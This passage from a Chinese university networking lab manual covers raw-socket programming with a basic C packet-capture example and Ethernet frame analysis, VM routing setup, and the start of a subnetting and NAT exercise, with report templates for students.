shell <span class="s16">将 </span>sudo echo 1 <span class="s16">的输出写入到</span>/proc/sys/net/ipv4/ip_forward <span class="s16">时，由于没有对应的写入权限</span>

（需要 <span class="s15">root</span>），因此会报错。

## <a name="bookmark7">实验二 </a><span class="s12">RAW SOCKET </span>编程与以太网帧分析基础

### <a name="bookmark8">实验任务</a>

1.  编写自己的抓包程序。在本机分别运行 <span class="s14">ping </span>程序和用浏览器浏览网页，使用该抓包程序记录相应的数据包，截图并做简要分析。

2.  <span class="s13">编写自己的 </span><span class="s14">ping </span><span class="s13">程序。利用 </span>Raw Socket <span class="s6">封装和发送以太网帧的功能，实现 </span>ICMP <span class="s6">包的发送和接收，并输出结果。分别运行你的 </span>ping <span class="s6">和系统的 </span>ping <span class="s6">程序，截图并作简单比较。</span>

提交材料：实验报告及程序源代码。

### <a name="bookmark9">实验报告</a>

由于本次实验着重程序的设计，试验报告中将不要求统一的配置性细节，大家可以自行设置实验环境。 

实验者需提交源代码以及实验报告。提交文件布局如下： 

<span>![image](计算机网络实验教材2.03(修订)/Image_016.jpg)</span>

其中 <span class="s32">source.c </span>为 <span class="s32">C </span>的源文件，<span class="s32">configuration.file </span>为相关配置文件。建议同学可以在<span class="s32">source.c </span>中的重要代码或者函数入口处添加注释，不做定性要求。 

实验报告请提交pdf 文档，其中应包含如下表所示的内容，同学可以根据内容进行修改。说明是为了更详细的解释各个项目，提交的实验报告中无需包含。 
<table style="border-collapse:collapse;margin-left:7.154pt" cellspacing="0"><tr style="height:21pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

实验目的 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:163pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

数据结构说明 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：此处需要解释各自的源代码中的数据结构，以及其用途。示例： 

struct xiaomaolv{ int id;

floag weight; int age;

};

该结构是一个描述 <span class="s34">xiaomaolv </span>的结构，对应于现实生活农场中养的毛驴，其中 <span class="s34">id </span>是其在农场中的编号，<span class="s34">weight,age </span>分别代表了该毛驴的质量和年龄。 
</td></tr><tr style="height:43pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

配置文件说明（非必须） 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：此处需要给出配置文件的格式以及读取方式，如程序中没有用到配置文件，则该项可省略 
</td></tr><tr style="height:208pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

程序设计的思路以及运行流程 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：此处需要给出程序的运行流程或者思路。请给出如下两种格式之一：

1.  流程图

2.  流程说明示例：

    1.  程序开始

        2.  读取配置

        3.  检测数据

        4.  处理数据

            1.  正确 <span class="s34">goto 3</span>

                2.  错误 <span class="s34">goto 5</span>
    5.  程序结束

</td></tr><tr style="height:26pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

运行结果截图 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请给出你的运行结果截图 
</td></tr><tr style="height:21pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

相关参考资料 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请给出你完成该实验的参考书目或者网页 
</td></tr><tr style="height:21pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

对比样例程序 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请给出你参考样例程序的部分，假如没有参考点，填无 
</td></tr><tr style="height:33pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

代码个人创新以及

思考 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请给出你认为你的源代码中的亮点，比如，针对某个细

节的处理或者算法的优化 
</td></tr><tr style="height:32pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

该程序的应用场景

创新（非必须） 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请思考一下，该类程序除了在背景中的应用之外，是否

还有其他可能的应用场景。 
</td></tr></table>

### <a name="bookmark10">背景知识</a>

1.  基础背景

在计算机网络中，<span class="s32">socket </span>是一个很重要的概念。因为，在网络通讯之中，我们可以把其理解为两个进程的通信，通信的话就要描述通信链路两端的信息。而套接字就是使用操作系统中的文件描述符和系统进程进行通信的一种手段。<span class="s32">Socket </span>有时也被看作是一个网络编程接口集，应用程序，或者<span class="s32">TCP/IP </span>协议栈。
目前，有许多类型的 <span class="s32">socket </span>可用，其中包括数据流套接字，数据报套接字，原始套接字等。其中在一般的应用程序之中，前二者用的比较多，但是，在一些安全程序，网络管理程序之中，对于数据链路层整体包的捕获要求，它们并不能很好的满足。那么，这里就要用 <span class="s32">raw socket</span>,也就是原始套接字。
原始套接字可以使得应用程序直接收发在网络上传输的包，那么我们就可以直接对原始数据包的内容进行修改和检测，这对特定环境下的应用非常必要。比如，在共享式以太网环境下，网络是共享的，所有的包传输都是通过同过如下方式进行传播的：发送主机要向另外一个主机发包，那么当这个包离开发送主机在网络上传输的时候，其他所有的主机都可以收到这个包，但是，在操作系统的内核协议栈上，对目标地址与自己无关的包都被丢弃了。那么对于网络管理员来说，可以对整个网络的数据进行监控和控制。
嗅探，就是网络管理员进行网络监控的一种途径。所谓嗅探，就是充分利用了以太网的特点，通过将网卡设置成混杂模式，将网络上传输的包进行捕获，并显示出来。通过这种方法，可以检测出网络的流量状况，<span class="s32">ARP </span>欺骗等一系列问题。

2.  Raw socket <span class="s23">编程基础</span>

Raw socket <span class="s6">的编程源自于</span>socket <span class="s6">编程，只是参数和实际收发包的整体内容有所区</span>

别。同
socket <span class="s6">一样，要收发包首先应该先建立一个 </span>socket<span class="s6">。</span>socket <span class="s6">的函数原型如下： </span>

int socket(int domain,int type,int protocol);<span class="s6"> </span>

其中 <span class="s32">domain </span>标识一个通信域，一般来说，通信域决定了真正用于通信的协议族。
 就目前来说，支持的域包括 <span class="s32">UNIX</span>,<span class="s32">INET</span>,<span class="s32">INET6</span>,<span class="s32">IPX </span>等连接服务。其中支持 <span class="s32">TCP/IP</span>协议的套接口类型是 <span class="s32">INET </span>。在 <span class="s32">Linux </span>的 <span class="s32">INET </span>套接口支持 <span class="s32">SOCK_STREAM</span>, <span class="s32">SOCK_DGRAM</span>, <span class="s32">SOCK_RAW </span>等套接口类型。下面是一个创建普通套接字类型的例子。
int sockfd;

sockfd = socket(AF_INET, SOCK_RAW, protocol);

这是一个很普通的创建<span class="s32">raw socket </span>的操作，但是他所真正控制的仅仅是一个 <span class="s32">IP </span>包，假如我们要对数据链路层的数据进行操作，我们需要按照如下方式进行创建
sockfd = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_IP)<span class="s6">； </span>

创建完 <span class="s32">socket</span>,可以自定义 <span class="s32">socket </span>的行为,对应的函数原型是
setsockopt(int sockfd,int level,int optname,const void * optval,socklen_t optlen);

其中参数的含义分别是：<span class="s32">sockfd </span>指明要设置的套接字描述符，<span class="s32">level </span>指明定义的层次，一般可用的选项有 <span class="s32">SOL_SOCKET, IPPROTO_IP, IPPROTO_IPV6, IPPROTO_TCP</span>。例如在

socket API <span class="s6">的层次来定义选项，可以将 </span>level <span class="s6">设置成 </span>SOL_SOCKET<span class="s6">。</span>optname <span class="s6">指明要设置的选项 </span>ID<span class="s6">，而 </span>optval <span class="s6">则是存放选项值的地址，</span>optlen <span class="s6">指明选项值的长度。假设我们要在发送 </span>UDP <span class="s6">包的时候使其进行广播，有</span>

int bBroadcast=1;

setsockopt(s,SOL_SOCKET,SO_BROADCAST,(const char*)&amp;bBroadcast,sizeof(int));

创建完一个 <span class="s32">socket </span>之后,这个 <span class="s32">socketfd </span>对应的<span class="s32">socket </span>就可以收包了
  <span class="s32">recvfrom(int sockfd,void* buf,size_t len,int flags,struct sockaddr * src_addr,socklen_t * addrlen);</span>
  其中 <span class="s32">buf </span>是收到的包所存放的位置,这里假如我们创建<span class="s32">socket </span>的给出的参数是接收数据链路层上的包,那么我们可以获得的数据包就是以太帧。
  在 <span class="s32">Linux </span>中，调用 <span class="s32">man </span>可以查看相关命令的调用细节，如 <span class="s32">man socket</span>.此处应当注意，
man <span class="s6">手册共有 </span>8 <span class="s6">个</span>sections<span class="s6">，每个对应于不同的区域。一般而言，对于程序设计者来说，会用 </span>man 2<span class="s6">，这里用的环境是 </span>ubuntu 18.04<span class="s6">，</span>man <span class="s6">的默认 </span>section <span class="s6">为 </span>7<span class="s6">。 </span>

<span>![image](计算机网络实验教材2.03(修订)/Image_017.jpg)</span>

图 1

3.  以太帧解析

所谓以太帧，就是在以太网上传输数据的时候用的一个单位。在以太网上跑的基本是 <span class="s32">MAC </span>包头的包，此时就有如下的 <span class="s32">MAC </span>包， 

<span>![image](计算机网络实验教材2.03(修订)/Image_018.jpg)</span>

图 2 

根据 <span class="s32">MAC </span>头部的类型信息， 对应的数据部分有多种可能。叫常用的有

0800<span class="s6">,</span>0806<span class="s6">,</span>8035<span class="s6">。分别对应于 </span>IP <span class="s6">数据包，</span>ARP <span class="s6">请求/应答，</span>RARP <span class="s6">请求应答。 其中 </span>IP <span class="s6">数据包的格式如下： </span>

<span>![image](计算机网络实验教材2.03(修订)/Image_019.jpg)</span>

图 3 

下面是一个用 <span class="s32">Wireshark </span>抓取的 <span class="s32">ARP </span>请求包 

<span>![image](计算机网络实验教材2.03(修订)/Image_020.jpg)</span> 

图 4 

在这个图中，我们可以看到一个以太帧的完整格式，包括整个以太帧的 <span class="s32">16 </span>进制表示。 一些相关的资料链接 

1.  [http://en.wikipedia.org/wiki/Raw_socket](http://en.wikipedia.org/wiki/Raw_socket)

2.  [http://bbs3.chinaunix.net/viewthread.php?tid=876233](http://bbs3.chinaunix.net/viewthread.php?tid=876233)

### <a name="bookmark11">实验目标</a>

本实验主要目的是让学生熟悉 <span class="s32">Linux </span>环境下基本的<span class="s32">raw socket </span>编程，对以太网帧进行初步分析，可通过程序完成对不同层次 <span class="s32">PDU </span>的字段分析，修改和重新发送。

### <a name="bookmark12">部署，操作</a><span class="s26">/</span>设计步骤 （虚拟机器的配置和拓扑）

我们要做的事情就是运行一个我们用 <span class="s32">raw socket </span>实现的程序，该程序用来捕获主机之间互相发送的包，并可以修改相关字段并重新发送。

首先，我们应当明白，用 <span class="s32">raw socket </span>捕获的数据包内容是存放在一个缓冲区内，一般情况下，是一个指针指向的内存区域。内存区域的不同字段所代表的含义是网络协议事先规定好的。修改相关字段也仅仅是修改对应内存上的数据而已。下面，给出实验的步骤。

1.  虚拟机配置

我们需要的网络拓扑如下：
<span>![image](计算机网络实验教材2.03(修订)/Image_021.jpg)</span>

图 5
在 <span class="s32">VMWare </span>设置如下，设置两台主机和一台路由，配置其为 <span class="s32">PC1</span>, <span class="s32">PC2</span>，<span class="s32">Router</span>。在这里，我们用一台 <span class="s32">Linux </span>主机来模拟 <span class="s32">Router</span>。

<span class="s35">分别打开</span>shell<span class="s35">,输入如下命令(网卡编号以真机为准)： </span>PC 1$ **sudo ifconfig eth0 192.168.2.2 netmask 255.255.255.0 **PC 1$ **sudo route add default gw 192.168.2.1**

PC 2$ **sudo ifconfig eth0 192.168.3.2 netmask 255.255.255.0**

PC 2$ **sudo route add default gw 192.168.3.1**

配置 <span class="s36">Router </span>并开启 <span class="s36">Router </span>的路由转发功能

Router$ **sudo ifconfig eth0 192.168.2.1 netmask 255.255.255.0 **Router$ **sudo ifconfig eth1 192.168.3.1 netmask 255.255.255.0 **Router$ **sudo su**

Router# **echo 1 &gt; /proc/sys/net/ipv4/ip_forward**

测试

PC 1$ **ping 192.168.3.2**

如果能 <span class="s32">Ping </span>通说明连接已经建立，下面对抓包程序进行说明。

2.  代码实现与检测
下面给出一个简单的抓包代码 <span class="s39">#include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/socket.h&gt;</span>

#include &lt;sys/types.h&gt; #include &lt;linux/if_ether.h&gt; #include &lt;netinet/in.h&gt; #define BUFFER_MAX 2048

int main(int argc,char* argv[]){ int sock_fd;

int proto; int n_read;

char buffer[BUFFER_MAX]; char *eth_head;

char *ip_head; char *tcp_head; char *udp_head; char *icmp_head; unsigned char *p;

if((sock_fd=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL)))&lt;0)

{ printf(&quot;error create raw socket\n&quot;); return -1;

}

while(1){

n_read = recvfrom(sock_fd,buffer,2048,0,NULL,NULL); if(n_read &lt; 42)

{

printf(&quot;error when recv msg \n&quot;); return -1;

}

eth_head = buffer; p = eth_head;

printf(&quot;MAC address: %.2x:%02x:%02x:%02x:%02x:%02x

==&gt; %.2x:%02x:%02x:%02x:%02x:%02x\n&quot;, p[6],p[7],p[8],p[9],p[10],p[11],

p[0],p[1],p[2],p[3],p[4],p[5]);

ip_head = eth_head+14; p = ip_head+12;

printf(&quot;IP:%d.%d.%d.%d==&gt; %d.%d.%d.%d\n&quot;, p[0],p[1],p[2],p[3],p[4],p[5],p[6],p[7]);

proto = (ip_head + 9)[0]; p = ip_head +12; printf(&quot;Protocol:&quot;); switch(proto){

case IPPROTO_ICMP:printf(&quot;icmp\n&quot;);break; case IPPROTO_IGMP:printf(&quot;igmp\n&quot;);break; case IPPROTO_IPIP:printf(&quot;ipip\n&quot;);break; case IPPROTO_TCP:printf(&quot;tcp\n&quot;);break; case IPPROTO_UDP:printf(&quot;udp\n&quot;);break; default:printf(&quot;Pls query yourself\n&quot;);

}

}

return -1;

}

程序的思路很简单，就是建立一个简单的链路层 <span class="s40">socket</span>,然后不断的收包，显示包的部分内容，并根据包头类型域的值来显示包的类型。

在任何一台机器上编译该程序
PC <span class="s40">1$ </span>**gcc raw_socket.c –o raw_socket**

编译成功之后运行(运行时需要 <span class="s40">root </span>权限)
PC <span class="s40">1$ </span>**sudo ./raw_socket**

会收到相应的包并有结果输出 在笔者的机器上，输出如下：
<span>![image](计算机网络实验教材2.03(修订)/Image_022.png)</span>

<span class="s32">PC </span>1 Ping <span class="s32">PC </span>2 <span class="s6">的情况 （框中内容为完整起见列出，实际不显示） </span>MAC address: <span class="s32">PC </span>1’s mac address ===&gt; Router’s mac address IP:192.168.0.2 ==&gt; 192.168.1.2

Protocol:icmp

MAC address: Router’s mac address ===&gt; <span class="s32">PC </span>1’s mac address IP: 192.168.1.2 ==&gt; 192.168.0.2

Protocol:icmp

实验者需修改程序，使其对更多的网络协议进行支持，比如 <span class="s32">ARP </span>协议。并最好可以在终端下模仿<span class="s32">Wireshark</span>,<span class="s32">TCPDump</span>,<span class="s32">OmniPeek </span>等主流抓包工具的输出方式。同时应该尝试对数据段进行更改，比如可以自己调用 <span class="s32">Raw Socket API </span>来发送一个 <span class="s32">ICMP </span>请求包，而不是通过调用 <span class="s32">Ping </span>命令来发送，等待和分析目的主机的回应。关于修改数据段的操

作，可以尝试使用 <span class="s32">memset </span>函数。

### <a name="bookmark13">补充内容</a>

创建<span class="s14">socket</span>时，若将<span class="s14">protocol</span>参数设置为<span class="s14">ETH_P_IP</span>，则不能抓取本机发送出去的数据包，具体原因见：<span class="s14">https://lkml.org/lkml/1999/12/23/112</span>

sock_raw <span class="s13">编程可以接收到本机网卡上的数据帧或包，对于监听网络流量和分析是很有作用的。一共可以有 </span>3 <span class="s13">种方式创建：</span>

    *   socket(AF_INET, SOCK_RAW, IPPROTO_TCP | IPPROTO_UDP | IPPROTO_ICMP)<span class="s13">，发送和接收 </span>IP <span class="s13">数据包；</span>

        *   socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP |ETH_P_ARP |ETH_P_ALL))<span class="s13">，发送和接收以太网数据帧</span>

        *   socket(AF_INET, SOCK_PACKET, htons(ETH_P_IP|ETH_P_ARP|ETH_P_ALL))<span class="s13">，老的用法，不推荐。</span>

## <a name="bookmark14">实验三 子网划分和 </a><span class="s12">NAT </span>配置

### <a name="bookmark15">实验任务</a>

<span>![image](计算机网络实验教材2.03(修订)/Image_023.jpg)</span>

1.  按照如图所示的网络拓扑，配置网络，形成三个子网，子网 <span class="s14">1</span>（<span class="s14">PC0</span>，<span class="s14">PC1</span>），<span class="s14">2</span>（<span class="s14">PC3</span>），

3<span class="s13">（</span>PC2<span class="s13">），在 </span>router0 <span class="s13">上设置路由规则，使得子网 </span>1 <span class="s13">和子网 </span>2 <span class="s13">变成内网，子网 </span>3 <span class="s13">和 </span>router0

的一个端口处于公网。

设置完成之后，让<span class="s14">PC0</span>，<span class="s14">PC2</span>，<span class="s14">PC3 </span>两两互<span class="s14">ping</span>，并把截图记录下来。

2.  设置 <span class="s14">iptables </span>规则，内网设备可以通过 <span class="s14">NAT </span>跟公网设备通信。

设置完成之后，让<span class="s14">PC0</span>，<span class="s14">PC2</span>，<span class="s14">PC3 </span>两两互<span class="s14">ping</span>，并把截图记录下来。

3.  比较 <span class="s14">1 </span>和 <span class="s14">2 </span>的结果，并解释 <span class="s14">NAT </span>所起到的作用。

### <a name="bookmark16">实验报告</a>

按要求完成实验，并写出实验报告。实验报告格式如下，同学可以根据内容进行修改。说明是为了更详细的解释各个项目，提交的报告中无需包含。
<table style="border-collapse:collapse;margin-left:7.154pt" cellspacing="0"><tr style="height:18pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

实验目的
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:18pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

网络拓扑配置
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：填写附表 <span class="s19">1</span>，并绘图说明
</td></tr><tr style="height:17pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

路由规则配置
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：写明输入的命令
</td></tr><tr style="height:17pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

NAT <span class="s18">设置命令</span>
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：写出所使用的命令
</td></tr><tr style="height:38pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

数据包截图
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：用 <span class="s19">wireshark </span>抓包截图
</td></tr><tr style="height:21pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

协议报文分析
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：对抓取的数据包进行字段分析
</td></tr></table>

附表 <span class="s14">1</span>：
<table style="border-collapse:collapse;margin-left:22.27pt" cellspacing="0"><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

节点名
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

虚拟设备名
</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

ip
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

netmask
</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="3">

Router0
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="3">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth0:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth1:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth2:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

Router1
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth0:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth1:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

PC0
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

PC1
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

PC2
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

PC3
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr></table>

### <a name="bookmark17">背景知识</a>

1.  子网划分

以太网交换机在数据链路层上基于端口进行了数据使得冲突域被缩小到交换机的每一个端口，有效地提高了网络系统的利用率。但随着网络规模的增大，网络内主机数量急剧增加。当这些主机都同属一个局域网即同一广播域时，网络中任一主机发送的广播报文将被转发给广播域中的全部主机，造成网络利用率大幅下降。为避免这种情况，我们将大的广播域隔离成多个较小的广播域，即进行子网划分。

